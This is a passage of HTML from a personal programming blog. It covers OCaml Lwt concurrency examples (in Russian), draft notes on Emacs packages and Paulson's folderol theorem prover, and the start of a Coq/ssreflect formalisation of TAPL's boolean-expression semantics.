</span></span><span style="display:flex;"><span>  <span style="color:#728e00">let</span><span style="color:#728e00">%</span><span style="color:#434f54">lwt</span> <span style="color:#434f54">()</span> <span style="color:#728e00">=</span> <span style="color:#434f54">Lwt_unix</span>.<span style="color:#434f54">sleep</span> <span style="color:#434f54">1</span><span style="color:#728e00">.</span><span style="color:#434f54">0</span> <span style="color:#728e00">in</span>
</span></span><span style="display:flex;"><span>  <span style="color:#434f54">tic</span> <span style="color:#434f54">()</span>
</span></span></code></pre></div><p>Пример запуска нескольких “потоков” и ожидание их результатов.</p>
<p>Допустим у нас есть пара ф-ций <code>f</code> и <code>g</code>:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ocaml" data-lang="ocaml"><span style="display:flex;"><span><span style="color:#728e00">val</span> <span style="color:#434f54">f</span> <span style="color:#728e00">:</span> <span style="color:#00979d">unit</span> <span style="color:#728e00">-&gt;</span> <span style="color:#00979d">unit</span> <span style="color:#434f54">Lwt</span>.<span style="color:#434f54">t</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">val</span> <span style="color:#434f54">g</span> <span style="color:#728e00">:</span> <span style="color:#00979d">unit</span> <span style="color:#728e00">-&gt;</span> <span style="color:#00979d">unit</span> <span style="color:#434f54">Lwt</span>.<span style="color:#434f54">t</span>
</span></span></code></pre></div><p>Следующий код запустит их вычисления последовательно:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ocaml" data-lang="ocaml"><span style="display:flex;"><span><span style="color:#728e00">let</span><span style="color:#728e00">%</span><span style="color:#434f54">lwt</span> <span style="color:#434f54">()</span> <span style="color:#728e00">=</span> <span style="color:#434f54">f</span> <span style="color:#434f54">()</span> <span style="color:#728e00">in</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">let</span><span style="color:#728e00">%</span><span style="color:#434f54">lwt</span> <span style="color:#434f54">()</span> <span style="color:#728e00">=</span> <span style="color:#434f54">g</span> <span style="color:#434f54">()</span> <span style="color:#728e00">in</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">...</span>
</span></span></code></pre></div><p>А вот так мы можем запустить обе ф-ции конкурентно и сразу же
подождать их завершения:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ocaml" data-lang="ocaml"><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#434f54">p1</span> <span style="color:#728e00">=</span> <span style="color:#434f54">f</span> <span style="color:#434f54">()</span> <span style="color:#728e00">in</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#434f54">p2</span> <span style="color:#728e00">=</span> <span style="color:#434f54">g</span> <span style="color:#434f54">()</span> <span style="color:#728e00">in</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">let</span><span style="color:#728e00">%</span><span style="color:#434f54">lwt</span> <span style="color:#434f54">()</span> <span style="color:#728e00">=</span> <span style="color:#434f54">p1</span> <span style="color:#728e00">in</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">let</span><span style="color:#728e00">%</span><span style="color:#434f54">lwt</span> <span style="color:#434f54">()</span> <span style="color:#728e00">=</span> <span style="color:#434f54">p2</span> <span style="color:#728e00">in</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">...</span>
</span></span></code></pre></div><p>Пример ф-ции, которая выполняет все вычисления из списка
конкрурентно:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ocaml" data-lang="ocaml"><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#728e00">rec</span> <span style="color:#434f54">map</span> <span style="color:#434f54">f</span> <span style="color:#434f54">l</span> <span style="color:#728e00">=</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">match</span> <span style="color:#434f54">l</span> <span style="color:#728e00">with</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#434f54">[]</span> <span style="color:#728e00">-&gt;</span> <span style="color:#434f54">Lwt</span>.<span style="color:#434f54">return</span> <span style="color:#434f54">[]</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#434f54">v</span> <span style="color:#728e00">::</span> <span style="color:#434f54">r</span> <span style="color:#728e00">-&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#728e00">let</span> <span style="color:#434f54">t</span> <span style="color:#728e00">=</span> <span style="color:#434f54">f</span> <span style="color:#434f54">v</span> <span style="color:#728e00">in</span>
</span></span><span style="display:flex;"><span>      <span style="color:#728e00">let</span> <span style="color:#434f54">rt</span> <span style="color:#728e00">=</span> <span style="color:#434f54">map</span> <span style="color:#434f54">f</span> <span style="color:#434f54">r</span> <span style="color:#728e00">in</span>
</span></span><span style="display:flex;"><span>      <span style="color:#728e00">let</span><span style="color:#728e00">%</span><span style="color:#434f54">lwt</span> <span style="color:#434f54">v&#39;</span> <span style="color:#728e00">=</span> <span style="color:#434f54">t</span> <span style="color:#728e00">in</span>
</span></span><span style="display:flex;"><span>      <span style="color:#728e00">let</span><span style="color:#728e00">%</span><span style="color:#434f54">lwt</span> <span style="color:#434f54">l&#39;</span> <span style="color:#728e00">=</span> <span style="color:#434f54">rt</span> <span style="color:#728e00">in</span>
</span></span><span style="display:flex;"><span>      <span style="color:#434f54">Lwt</span>.<span style="color:#434f54">return</span> <span style="color:#728e00">(</span><span style="color:#434f54">v&#39;</span> <span style="color:#728e00">::</span> <span style="color:#434f54">l&#39;</span><span style="color:#728e00">)</span>
</span></span></code></pre></div><p>Следующая ф-ция наоборот, ожидает пока выполнится каждое
предыдущее вычисление из списка, прежде чем запустить следующее:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ocaml" data-lang="ocaml"><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#728e00">rec</span> <span style="color:#434f54">map_serial</span> <span style="color:#434f54">f</span> <span style="color:#434f54">l</span> <span style="color:#728e00">=</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">match</span> <span style="color:#434f54">l</span> <span style="color:#728e00">with</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#434f54">[]</span> <span style="color:#728e00">-&gt;</span> <span style="color:#434f54">return</span> <span style="color:#434f54">[]</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#434f54">v</span> <span style="color:#728e00">::</span> <span style="color:#434f54">r</span> <span style="color:#728e00">-&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#728e00">let</span><span style="color:#728e00">%</span><span style="color:#434f54">lwt</span> <span style="color:#434f54">v&#39;</span> <span style="color:#728e00">=</span> <span style="color:#434f54">f</span> <span style="color:#434f54">v</span> <span style="color:#728e00">in</span>
</span></span><span style="display:flex;"><span>      <span style="color:#728e00">let</span><span style="color:#728e00">%</span><span style="color:#434f54">lwt</span> <span style="color:#434f54">l&#39;</span> <span style="color:#728e00">=</span> <span style="color:#434f54">map_serial</span> <span style="color:#434f54">f</span> <span style="color:#434f54">r</span> <span style="color:#728e00">in</span>
</span></span><span style="display:flex;"><span>      <span style="color:#434f54">Lwt</span>.<span style="color:#434f54">return</span> <span style="color:#728e00">(</span><span style="color:#434f54">v&#39;</span> <span style="color:#728e00">::</span> <span style="color:#434f54">l&#39;</span><span style="color:#728e00">)</span>
</span></span></code></pre></div><p>Конечно, это только самые “вершки” Lwt.</p>
</li>
</ul>
<h4 id="полезные-ссылки">
  Полезные ссылки
  <a class="heading-link" href="#%d0%bf%d0%be%d0%bb%d0%b5%d0%b7%d0%bd%d1%8b%d0%b5-%d1%81%d1%81%d1%8b%d0%bb%d0%ba%d0%b8">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h4>
<ul>
<li><a href="https://www.cs.cornell.edu/courses/cs3110/2019sp/textbook/ads/promises.html"  class="external-link" target="_blank" rel="noopener">Promises </a> в книге Functional Programming in OCaml</li>
<li><a href="https://gitter.im/ocaml-lwt/Lobby"  class="external-link" target="_blank" rel="noopener">Lwt Gitter</a></li>
<li>Туториал <a href="https://ocsigen.org/tuto/6.4/manual/lwt"  class="external-link" target="_blank" rel="noopener">Lwt in 5 minutes</a></li>
<li><a href="https://ocsigen.org/lwt/4.4.0/manual/manual"  class="external-link" target="_blank" rel="noopener">Lwt мануал</a></li>
<li><a href="https://www.baturin.org/code/lwt-counter-server/"  class="external-link" target="_blank" rel="noopener">Туториал</a> про то, как сделать простой сервер на сокетах, позволяющий
клиентам подключаться, увеличивать счётчик и читать его
значение.</li>
</ul>
<h2 id="emacs">
  Emacs <span class="tag"><span class="_emacs">@emacs</span><span class="emacs">emacs</span></span>
  <a class="heading-link" href="#emacs">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h2>
<h3 id="my-first-emacs-package-ormolu">
  <span class="org-todo todo DRAFT">DRAFT</span> My first Emacs package: ormolu.el <span class="tag"><span class="ormolu">ormolu</span></span>
  <a class="heading-link" href="#my-first-emacs-package-ormolu">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h3>
<h4 id="intro">
  Intro
  <a class="heading-link" href="#intro">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h4>
<p>I&rsquo;ve been using Emacs on a daily basis for about 2 years already,</p>
<p><a href="https://github.com/tweag/ormolu"  class="external-link" target="_blank" rel="noopener">Ormolu</a> is an opinionated zero-configuration formatter for
Haskell source code built in <a href="http://tweag.io"  class="external-link" target="_blank" rel="noopener">Tweag</a>.</p>
<h3 id="emacs-tiger-mode">
  <span class="org-todo todo DRAFT">DRAFT</span> Writing an Emacs major mode for the Tiger language
  <a class="heading-link" href="#emacs-tiger-mode">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h3>
<h4 id="references">
  References
  <a class="heading-link" href="#references">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h4>
<p>There is a really good tutorial by Xah Lee: <a href="http://ergoemacs.org/emacs/elisp_write_major_mode_index.html"  class="external-link" target="_blank" rel="noopener">Emacs Lisp How to
Write Major Mode</a>, which I highly recommend reading.</p>
<h2 id="formal-methods">
  Formal Methods
  <a class="heading-link" href="#formal-methods">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h2>
<h3 id="theorem-provers">
  Theorem Provers
  <a class="heading-link" href="#theorem-provers">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h3>
<p>:@theorem_provers:theorem_provers:</p>
<h4 id="designing-a-theorem-prover-part-1">
  Designing a Theorem Prover, Part 1 <span class="tag"><span class="folderol">folderol</span></span>
  <a class="heading-link" href="#designing-a-theorem-prover-part-1">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h4>
<div class="ox-hugo-toc toc">
<div class="heading">Table of Contents</div>
<ul>
<li><a href="#making-of-tiger" >Making of Tiger</a>:@compilers:compilers&#x1f42f;ocaml:
<ul>
<li><a href="#making-of-tiger-1-intro" ><span class="org-todo done DONE">DONE</span> Making of Tiger #1, Intro</a></li>
<li><a href="#making-of-tiger-2-lexical-analysis" ><span class="org-todo done DONE">DONE</span> Making of Tiger #2, Lexical Analysis</a>:lexing:ocamllex:</li>
<li><a href="#making-of-tiger-3-parsing" ><span class="org-todo done DONE">DONE</span> Making of Tiger #3, Parsing</a>:parsing:menhir:</li>
<li><a href="#making-of-tiger-4-abstact-syntax" ><span class="org-todo todo DRAFT">DRAFT</span> Making of Tiger #4, Abstract Syntax</a>:ast:</li>
<li><a href="#making-of-tiger-5-semantic-analysis" ><span class="org-todo todo TODO">TODO</span> Making of Tiger #5, Semantic Analysis</a>:type_checking:</li>
<li><a href="#making-of-tiger-6-stack-frames" ><span class="org-todo done DONE">DONE</span> Making of Tiger #6, Stack frames</a>:stack:memory:</li>
</ul>
</li>
<li><a href="#haskell" >Haskell</a>:@haskell:haskell:
<ul>
<li><a href="#a-week-of-liquid-haskell" ><span class="org-todo todo TODO">TODO</span> A week of Liquid Haskell</a>:@liquid_haskell:liquid_haskell:refinement_types:</li>
<li><a href="#building-a-toy-ethereum-like-vm-in-haskell" ><span class="org-todo todo TODO">TODO</span> Building a toy Ethereum-like VM in Haskell</a>:compilers:ethereum:vm:</li>
<li><a href="#writing-a-simple-trading-bot-in-haskell" ><span class="org-todo todo TODO">TODO</span> Writing a simple trading bot in Haskell</a>:trading:</li>
<li><a href="#notes-on-parallel-and-concurrent-programming-in-haskell" ><span class="org-todo todo TODO">TODO</span> Notes on parallel &amp; concurrent programming in Haskell</a></li>
</ul>
</li>
<li><a href="#ocaml" >OCaml</a>:@ocaml:ocaml:
<ul>
<li><a href="#instrumenting-and-profiling-ocaml" ><span class="org-todo todo DRAFT">DRAFT</span> Instrumenting and profiling OCaml programs</a>:benchmarking:profiling:performance:</li>
<li><a href="#benchmarking-ocaml-code" ><span class="org-todo todo DRAFT">DRAFT</span> Benchmarking OCaml code</a>:benchmarking:performance:</li>
<li><a href="#about-lwt.ru-ru" ><span class="org-todo done DONE">DONE</span> Заметка о Lwt</a>:lwt:</li>
</ul>
</li>
<li><a href="#emacs" >Emacs</a>:@emacs:emacs:
<ul>
<li><a href="#my-first-emacs-package-ormolu" ><span class="org-todo todo DRAFT">DRAFT</span> My first Emacs package: ormolu.el</a>:ormolu:</li>
<li><a href="#emacs-tiger-mode" ><span class="org-todo todo DRAFT">DRAFT</span> Writing an Emacs major mode for the Tiger language</a></li>
</ul>
</li>
<li><a href="#formal-methods" >Formal Methods</a>
<ul>
<li><a href="#theorem-provers" >Theorem Provers</a></li>
</ul>
</li>
<li><a href="#coq" >Coq</a>:@coq:coq:
<ul>
<li><a href="#notes-on-coq-and-ssreflect" >Notes on Coq and Ssreflect</a>:ssreflect:</li>
<li><a href="#proving-tapl-in-coq" >Proving TAPL in Coq</a>:tapl:</li>
<li><a href="#notes-on-types-in-coq.ru-ru" ><span class="org-todo done DONE">DONE</span> Заметки про типы в Coq (WIP)</a></li>
</ul>
</li>
<li><a href="#rust" >Rust</a>:@rust:rust:
<ul>
<li><a href="#exploring-async-basics.ru-ru" ><span class="org-todo done DONE">DONE</span> Зелёные потоки в 200 строчек на Rust. Часть 1</a>:@arm64:</li>
</ul>
</li>
<li><a href="#assembly" >Assembly</a>:@assembly:assembly:
<ul>
<li><a href="#arm64-assembly-1.ru-ru" ><span class="org-todo done DONE">DONE</span> Программирование для ARM64. Часть 1</a>:@arm64:</li>
</ul>
</li>
<li><a href="#blockchain" >Blockchain</a>:@blockchain:blockchain:
<ul>
<li><a href="#who-to-follow" >Who to follow</a></li>
<li><a href="#hahacks" >Hahacks</a></li>
<li><a href="#evm" >EVM</a>:@evm:@solidity:evm:solidity:</li>
<li><a href="#ethereum-security-audit" >Ethereum Security Audit</a></li>
<li><a href="#my-path-to-blockchain-security-audit" >My path to blockchain security audit</a>:security:</li>
<li><a href="#ctf-walkthrough" >CTF walkthrough</a>:@ctf:ctf:security:</li>
</ul>
</li>
</ul>
</div>
<!--endtoc-->
<p>This is a summary.</p>
<!--list-separator-->
<ul>
<li>
<p>Intro</p>
<p>I&rsquo;m going to work through the
<a href="https://arxiv.org/pdf/cs/9301110"  class="external-link" target="_blank" rel="noopener">folderol</a> by Lawrence C
Paulson (1990).</p>
 <!--list-separator-->
<ul>
<li>
<p>Automated Theorem Proving</p>
<p>There are 2 terms that have different meaning:</p>
<ol>
<li><strong>Proof Assistant</strong> or <strong>Interactive Theorem Prover</strong>
(<a href="https://en.wikipedia.org/wiki/Proof_assistant"  class="external-link" target="_blank" rel="noopener">wiki</a>) –
Assists with the development of formal proofs by
human-machine collaboration. Usually in the form of keeping
track of what you need to prove and what you have proved. For
example: Coq, Lean, Agda, Isabelle, F*.</li>
<li><strong>Automated Theorem Prover</strong> – Uses AI (or other similar,
relatively opaque algorithms) to come up with the steps to
the proof.</li>
</ol>
</li>
</ul>
 <!--list-separator-->
<ul>
<li>
<p>General Properties</p>
<ul>
<li>Works in classical <a href="https://en.wikipedia.org/wiki/First-order_logic"  class="external-link" target="_blank" rel="noopener">first-order logic</a> (<a href="https://ru.wikipedia.org/wiki/%D0%9B%D0%BE%D0%B3%D0%B8%D0%BA%D0%B0_%D0%BF%D0%B5%D1%80%D0%B2%D0%BE%D0%B3%D0%BE_%D0%BF%D0%BE%D1%80%D1%8F%D0%B4%D0%BA%D0%B0"  class="external-link" target="_blank" rel="noopener">ru</a>)</li>
<li>Follows automatic strategy but interactive</li>
<li>Prints trace of its rules as evidence</li>
</ul>
<p>There is no practical automatic proof procedure, even for most
complete theories. Even if there were, interaction with the
machine would still be necessary for exploring mathematics.</p>
</li>
</ul>
</li>
</ul>
<!--list-separator-->
<ul>
<li>
<p>Sequent Calculus</p>
 <!--list-separator-->
<ul>
<li>
<p>LK Inference Rules</p>
<p><strong>Structural</strong></p>
<p>\(\displaystyle \frac{\Gamma \vdash \Delta}{A, \Gamma \vdash \Delta} \,
(\text{WL})\), \(\displaystyle \frac{\Gamma \vdash \Delta}{\Gamma \vdash \Delta, A}
\, (\text{WR})\) – Thinning</p>
<p>\(\displaystyle \frac{A, A, \Gamma \vdash \Delta}{A, \Gamma \vdash \Delta} \,
(\text{CL})\), \(\displaystyle \frac{\Gamma \vdash \Delta, A, A}{\Gamma \vdash \Delta,
A} \, (\text{CR})\) – Contraction</p>
<p>\(\displaystyle \frac{\Gamma, A, B, \Theta \vdash \Delta}{\Gamma, B, A, \Theta \vdash \Delta}
\, (\text{PL})\), \(\displaystyle \frac{\Gamma \vdash \Delta, A, B, \Lambda}{\Gamma
\vdash \Delta, B, A, \Lambda} \, (\text{PR})\) – Permutation</p>
<p>\(\displaystyle \frac{\Gamma \vdash \Delta, A \quad A, \Theta \vdash \Lambda}{\Gamma, \Theta
\vdash \Delta, \Lambda} \, (\text{C})\) – Cut</p>
<p><strong>Logical</strong></p>
</li>
</ul>
</li>
</ul>
<h2 id="coq">
  Coq <span class="tag"><span class="_coq">@coq</span><span class="coq">coq</span></span>
  <a class="heading-link" href="#coq">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h2>
<h3 id="notes-on-coq-and-ssreflect">
  Notes on Coq and Ssreflect <span class="tag"><span class="ssreflect">ssreflect</span></span>
  <a class="heading-link" href="#notes-on-coq-and-ssreflect">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h3>
<h3 id="proving-tapl-in-coq">
  Proving TAPL in Coq <span class="tag"><span class="tapl">tapl</span></span>
  <a class="heading-link" href="#proving-tapl-in-coq">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h3>
<h4 id="proving-tapl-in-coq-ch-3">
  <span class="org-todo done DONE">DONE</span> Proving TAPL in Coq (ch 3, WIP)
  <a class="heading-link" href="#proving-tapl-in-coq-ch-3">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h4>
<p>In order to understand things clearly and to learn Coq proof
assistant at the same time, I&rsquo;ve decided to do some proves while
reading the TAPL book.</p>
<p>The code is <a href="https://github.com/vyorkin/tapl-coq"  class="external-link" target="_blank" rel="noopener">on the GitHub</a>.</p>
<p>For the excercises I want to use the <a href="https://coq.inria.fr/refman/proof-engine/ssreflect-proof-language.html"  class="external-link" target="_blank" rel="noopener">ssreflect</a> proof language
instead of <code>ltac</code>. I&rsquo;ll keep solutions to each chapter in a
separate file. We&rsquo;ll always work in the following context:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-coq" data-lang="coq"><span style="display:flex;"><span><span style="color:#728e00">Set</span> <span style="color:#728e00">Implicit</span> <span style="color:#728e00">Arguments</span><span style="color:#728e00">.</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">Unset</span> <span style="color:#728e00">Strict</span> <span style="color:#728e00">Implicit</span><span style="color:#728e00">.</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">Unset</span> <span style="color:#728e00">Printing</span> <span style="color:#728e00">Implicit</span> <span style="color:#434f54">Defensive</span><span style="color:#728e00">.</span>
</span></span><span style="display:flex;"><span><span style="color:#434f54">From</span> <span style="color:#434f54">Coq</span> <span style="color:#728e00">Require</span> <span style="color:#728e00">Import</span> <span style="color:#434f54">ssreflect</span><span style="color:#728e00">.</span>
</span></span></code></pre></div><p>I&rsquo;ll start with the operational semantics of boolean
expressions. Here is the definition in Coq:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-coq" data-lang="coq"><span style="display:flex;"><span><span style="color:#728e00">Inductive</span> <span style="color:#434f54">term</span> <span style="color:#728e00">:</span> <span style="color:#00979d">Type</span> <span style="color:#728e00">:=</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">|</span> <span style="color:#434f54">T_true</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">|</span> <span style="color:#434f54">T_false</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">|</span> <span style="color:#434f54">T_cond</span> <span style="color:#728e00">(</span><span style="color:#434f54">cond</span> <span style="color:#434f54">t1</span> <span style="color:#434f54">t2</span> <span style="color:#728e00">:</span> <span style="color:#434f54">term</span><span style="color:#728e00">).</span>
</span></span></code></pre></div><p>Let’s introduce a <a href="https://coq.inria.fr/refman/user-extensions/syntax-extensions.html#custom-entries"  class="external-link" target="_blank" rel="noopener">custom grammar entry</a> for expressiveness.</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-coq" data-lang="coq"><span style="display:flex;"><span><span style="color:#434f54">Declare</span> <span style="color:#434f54">Custom</span> <span style="color:#434f54">Entry</span> <span style="color:#434f54">term</span><span style="color:#728e00">.</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">Notation</span> <span style="color:#7f8c8d">&#34;[ e ]&#34;</span> <span style="color:#728e00">:=</span> <span style="color:#434f54">e</span> <span style="color:#728e00">(</span><span style="color:#434f54">e</span> <span style="color:#434f54">custom</span> <span style="color:#434f54">term</span> <span style="color:#434f54">at</span> <span style="color:#434f54">level</span> <span style="color:#434f54">2</span><span style="color:#728e00">).</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">Notation</span> <span style="color:#7f8c8d">&#34;( x )&#34;</span> <span style="color:#728e00">:=</span> <span style="color:#434f54">x</span> <span style="color:#728e00">(</span><span style="color:#728e00">in</span> <span style="color:#434f54">custom</span> <span style="color:#434f54">term</span><span style="color:#728e00">,</span> <span style="color:#434f54">x</span> <span style="color:#434f54">at</span> <span style="color:#434f54">level</span> <span style="color:#434f54">2</span><span style="color:#728e00">).</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">Notation</span> <span style="color:#7f8c8d">&#34;&#39;true&#39;&#34;</span>  <span style="color:#728e00">:=</span> <span style="color:#728e00">(</span><span style="color:#434f54">T_true</span><span style="color:#728e00">)</span>  <span style="color:#728e00">(</span><span style="color:#728e00">in</span> <span style="color:#434f54">custom</span> <span style="color:#434f54">term</span> <span style="color:#434f54">at</span> <span style="color:#434f54">level</span> <span style="color:#434f54">0</span><span style="color:#728e00">).</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">Notation</span> <span style="color:#7f8c8d">&#34;&#39;false&#39;&#34;</span> <span style="color:#728e00">:=</span> <span style="color:#728e00">(</span><span style="color:#434f54">T_false</span><span style="color:#728e00">)</span> <span style="color:#728e00">(</span><span style="color:#728e00">in</span> <span style="color:#434f54">custom</span> <span style="color:#434f54">term</span> <span style="color:#434f54">at</span> <span style="color:#434f54">level</span> <span style="color:#434f54">0</span><span style="color:#728e00">).</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">Notation</span> <span style="color:#7f8c8d">&#34;&#39;if&#39; cond &#39;then&#39; t1 &#39;else&#39; t2&#34;</span> <span style="color:#728e00">:=</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">(</span><span style="color:#434f54">T_cond</span> <span style="color:#434f54">cond</span> <span style="color:#434f54">t1</span> <span style="color:#434f54">t2</span><span style="color:#728e00">)</span> <span style="color:#728e00">(</span><span style="color:#728e00">in</span> <span style="color:#434f54">custom</span> <span style="color:#434f54">term</span> <span style="color:#434f54">at</span> <span style="color:#434f54">level</span> <span style="color:#434f54">2</span><span style="color:#728e00">).</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">Notation</span> <span style="color:#7f8c8d">&#34;x&#34;</span> <span style="color:#728e00">:=</span> <span style="color:#434f54">x</span> <span style="color:#728e00">(</span><span style="color:#728e00">in</span> <span style="color:#434f54">custom</span> <span style="color:#434f54">term</span> <span style="color:#434f54">at</span> <span style="color:#434f54">level</span> <span style="color:#434f54">0</span><span style="color:#728e00">,</span> <span style="color:#434f54">x</span> <span style="color:#434f54">constr</span> <span style="color:#434f54">at</span> <span style="color:#434f54">level</span> <span style="color:#434f54">0</span><span style="color:#728e00">).</span>
</span></span></code></pre></div><p>We can check that it works as expected:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-coq" data-lang="coq"><span style="display:flex;"><span><span style="color:#728e00">Check</span> <span style="color:#728e00">[</span> <span style="color:#434f54">true</span> <span style="color:#728e00">].</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">Check</span> <span style="color:#728e00">fun</span> <span style="color:#434f54">cond</span> <span style="color:#434f54">t1</span> <span style="color:#434f54">t2</span> <span style="color:#728e00">=&gt;</span> <span style="color:#728e00">[</span> <span style="color:#728e00">if</span> <span style="color:#434f54">cond</span> <span style="color:#728e00">then</span> <span style="color:#434f54">t1</span> <span style="color:#728e00">else</span> <span style="color:#434f54">t2</span> <span style="color:#728e00">].</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">Unset</span> <span style="color:#728e00">Printing</span> <span style="color:#434f54">Notations</span><span style="color:#728e00">.</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">Check</span> <span style="color:#728e00">fun</span> <span style="color:#434f54">cond</span> <span style="color:#434f54">t1</span> <span style="color:#434f54">t2</span> <span style="color:#728e00">=&gt;</span> <span style="color:#728e00">[</span> <span style="color:#728e00">if</span> <span style="color:#434f54">cond</span> <span style="color:#728e00">then</span> <span style="color:#434f54">t1</span> <span style="color:#728e00">else</span> <span style="color:#434f54">t2</span> <span style="color:#728e00">].</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">Set</span> <span style="color:#728e00">Printing</span> <span style="color:#434f54">Notations</span><span style="color:#728e00">.</span>
</span></span></code></pre></div><p>The <code>==&gt;</code> notation represents an evaluation relation on terms: &ldquo;<code>t</code>
evaluates to <code>t'</code> in one step&rdquo; (as per p.35)</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-coq" data-lang="coq"><span style="display:flex;"><span><span style="color:#728e00">Reserved</span> <span style="color:#728e00">Notation</span> <span style="color:#7f8c8d">&#34;t ==&gt; t&#39;&#34;</span> <span style="color:#728e00">(</span><span style="color:#434f54">at</span> <span style="color:#434f54">level</span> <span style="color:#434f54">50</span><span style="color:#728e00">).</span>
</span></span></code></pre></div><p>This relation is defined by three inference rules:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-coq" data-lang="coq"><span style="display:flex;"><span><span style="color:#728e00">Inductive</span> <span style="color:#434f54">eval_step</span> <span style="color:#728e00">:</span> <span style="color:#434f54">term</span> <span style="color:#728e00">-&gt;</span> <span style="color:#434f54">term</span> <span style="color:#728e00">-&gt;</span> <span style="color:#00979d">Prop</span> <span style="color:#728e00">:=</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">|</span> <span style="color:#434f54">E_IfTrue</span>  <span style="color:#728e00">:</span> <span style="color:#728e00">forall</span> <span style="color:#434f54">t1</span> <span style="color:#434f54">t2</span><span style="color:#728e00">,</span> <span style="color:#728e00">[</span> <span style="color:#728e00">if</span> <span style="color:#434f54">true</span>  <span style="color:#728e00">then</span> <span style="color:#434f54">t1</span> <span style="color:#728e00">else</span> <span style="color:#434f54">t2</span> <span style="color:#728e00">]</span> <span style="color:#728e00">==&gt;</span> <span style="color:#434f54">t1</span>
